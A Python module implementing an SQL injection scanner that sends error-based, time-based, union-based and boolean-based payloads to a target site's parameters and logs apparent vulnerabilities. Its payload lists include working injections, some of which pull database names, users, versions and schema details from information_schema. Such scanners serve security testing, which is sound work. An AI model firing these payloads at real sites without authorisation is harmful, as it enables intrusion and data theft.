"""SQL Injection (SQLi) Scanner Module
Comprehensive detection of SQL injection vulnerabilities including error-based, blind, and time-based attacks
"""

import requests
from colorama import Fore, Style, init
import logging
import json
import time
import re
from typing import Dict, List, Tuple
from bs4 import BeautifulSoup
from urllib.parse import urlparse, parse_qs, urlencode
import string

init(autoreset=True)
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)


class SQLiScanner:
    """Advanced SQL Injection vulnerability scanner with multiple detection methods"""
    
    def __init__(self, target: str, verbose: bool = False):
        self.target = target if target.startswith(('http://', 'https://')) else f"https://{target}"
        self.verbose = verbose
        self.session = requests.Session()
        self.session.headers.update({'User-Agent': 'Mozilla/5.0 (SQLi Scanner)'})
        self.vulnerabilities = []
        
        # Comprehensive SQLi payloads
        self.payloads = {
            'error_based': [
                "'", "\"", "1' AND '1'='1", "1' AND '1'='2",
                "1' OR '1'='1", "1\" OR \"1\"=\"1",
                "1' UNION SELECT NULL--", "1' UNION SELECT NULL,NULL--",
                "admin' --", "admin' #", "' OR 1=1--", "' OR 1=1#",
            ],
            'time_based': [
                "1' AND SLEEP(5)--", "1' OR SLEEP(5)--",
                "1; WAITFOR DELAY '00:00:05'--",
                "1' AND BENCHMARK(10000000,MD5('a'))--",
            ],
            'union_based': [
                "1' UNION SELECT NULL--",
                "1' UNION SELECT NULL,NULL--",
                "1' UNION SELECT NULL,NULL,NULL--",
                "1' UNION SELECT NULL,NULL,NULL,NULL--",
                "1' UNION SELECT database(),user(),version(),NULL--",
                "1' UNION SELECT table_name,column_name,NULL,NULL FROM information_schema.columns--",
            ],
            'boolean_based': [
                "1' AND '1'='1",
                "1' AND '1'='2",
                "1' AND SUBSTRING(user(),1,1)='r'",
                "1' AND (SELECT COUNT(*) FROM information_schema.tables)>0--",
            ]
        }
        
        self.results = {
            'target': self.target,
            'timestamp': time.time(),
            'vulnerabilities': [],
            'parameters_tested': [],
            'injection_types': []
        }
    
    def extract_parameters(self) -> List[str]:
        """Extract parameters from target URL and forms"""
        params = []
        
        # Extract from URL
        parsed = urlparse(self.target)
        if parsed.query:
            params.extend(parse_qs(parsed.query).keys())
        
        # Extract from forms
        try:
            response = self.session.get(self.target, timeout=10, verify=False)
            soup = BeautifulSoup(response.content, 'html.parser')
            
            for form in soup.find_all('form'):
                for input_field in form.find_all(['input', 'textarea', 'select']):
                    name = input_field.get('name')
                    if name:
                        params.append(name)
        except Exception as e:
            logger.debug(f"Parameter extraction failed: {e}")
        
        # Add common parameter names
        common_params = ['id', 'page', 'product', 'category', 'search', 'q', 'filter', 'sort']
        params.extend(common_params)
        
        return list(set(params))
    
    def test_error_based(self, param: str, base_url: str) -> List[Dict]:
        """Test for error-based SQL injection"""
        vulns = []
        
        for payload in self.payloads['error_based']:
            try:
                url = f"{base_url.split('?')[0]}?{param}={payload}"
                response = self.session.get(url, timeout=10, verify=False)
                
                # Check for SQL error indicators
                error_indicators = [
                    r'SQL syntax', r'mysql_fetch', r'SQL error', r'SYNTAX ERROR',
                    r'ORA-\d+', r'PostgreSQL', r'SQLServer', r'SQLite',
                    r'Unclosed quotation mark', r'The conversion',
                ]
                
                for indicator in error_indicators:
                    if re.search(indicator, response.text, re.IGNORECASE):
                        vuln = {
                            'type': 'Error-Based SQLi',
                            'parameter': param,
                            'payload': payload[:50],
                            'error_found': re.search(indicator, response.text).group(0),
                            'severity': 'Critical'
                        }
                        vulns.append(vuln)
                        logger.warning(f"SQLi detected in parameter '{param}'")
                        break
            except Exception as e:
                logger.debug(f"Error-based test failed: {e}")
        
        return vulns
    
    def test_time_based(self, param: str, base_url: str) -> List[Dict]:
        """Test for time-based blind SQL injection"""
        vulns = []
        
        for payload in self.payloads['time_based']:
            try:
                url = f"{base_url.split('?')[0]}?{param}={payload}"
                
                start_time = time.time()
                response = self.session.get(url, timeout=15, verify=False)
                elapsed = time.time() - start_time
                
                # If response is delayed, time-based injection likely
                if elapsed > 5:
                    vuln = {
                        'type': 'Time-Based Blind SQLi',
                        'parameter': param,
                        'payload': payload[:50],
                        'response_time': elapsed,
                        'severity': 'High'
                    }
                    vulns.append(vuln)
                    logger.warning(f"Time-based SQLi detected in parameter '{param}'")
            except requests.exceptions.Timeout:
                # Timeout indicates time-based injection
                vuln = {
                    'type': 'Time-Based Blind SQLi (Timeout)',
                    'parameter': param,
                    'payload': payload[:50],
                    'severity': 'High'
                }
                vulns.append(vuln)
            except Exception as e:
                logger.debug(f"Time-based test failed: {e}")
        
        return vulns
    
    def test_boolean_based(self, param: str, base_url: str) -> List[Dict]:
        """Test for boolean-based blind SQL injection"""
        vulns = []
        
        try:
            # Get baseline response
            url_true = f"{base_url.split('?')[0]}?{param}=1' AND '1'='1"
            url_false = f"{base_url.split('?')[0]}?{param}=1' AND '1'='2"
            
            response_true = self.session.get(url_true, timeout=10, verify=False)
            response_false = self.session.get(url_false, timeout=10, verify=False)
            
            # If responses differ significantly, boolean-based injection likely
            if len(response_true.text) != len(response_false.text):
                vuln = {
                    'type': 'Boolean-Based Blind SQLi',
                    'parameter': param,
                    'true_response_length': len(response_true.text),
                    'false_response_length': len(response_false.text),
                    'severity': 'High'
                }
                vulns.append(vuln)
                logger.warning(f"Boolean-based SQLi detected in parameter '{param}'")
        except Exception as e:
            logger.debug(f"Boolean-based test failed: {e}")
        
        return vulns
    
    def generate_report(self) -> Dict:
        """Generate comprehensive SQLi scan report"""
        print(f"\n{Fore.CYAN}[*] SQL Injection Scanner{Style.RESET_ALL}")
        print("=" * 60)
        
        # Extract parameters
        params = self.extract_parameters()
        print(f"{Fore.BLUE}[*] Testing {len(params)} parameters{Style.RESET_ALL}")
        
        # Test each parameter
        for param in params:
            error_vulns = self.test_error_based(param, self.target)
            time_vulns = self.test_time_based(param, self.target)
            bool_vulns = self.test_boolean_based(param, self.target)
            
            self.vulnerabilities.extend(error_vulns + time_vulns + bool_vulns)
        
        # Build results
        self.results['vulnerabilities'] = self.vulnerabilities
        self.results['total_found'] = len(self.vulnerabilities)
        
        # Display results
        if self.vulnerabilities:
            print(f"\n{Fore.RED}[!] SQL Injection Vulnerabilities Found: {len(self.vulnerabilities)}{Style.RESET_ALL}")
            for vuln in self.vulnerabilities:
                print(f"  Type: {vuln['type']}")
                print(f"  Parameter: {vuln['parameter']}")
                print(f"  Severity: {vuln['severity']}")
        else:
            print(f"{Fore.GREEN}[+] No SQL injection vulnerabilities detected{Style.RESET_ALL}")
        
        return self.results


def sqli_scan(target: str, verbose: bool = False) -> Dict:
    """Main SQL injection scanning function"""
    try:
        scanner = SQLiScanner(target, verbose)
        results = scanner.generate_report()
        
        # Save results
        filename = f"sqli_scan_{int(time.time())}.json"
        with open(filename, 'w') as f:
            json.dump(results, f, indent=2)
        
        print(f"\n{Fore.GREEN}[+] Report saved to {filename}{Style.RESET_ALL}")
        return results
    except Exception as e:
        logger.error(f"SQLi scan failed: {e}")
        return {'error': str(e)}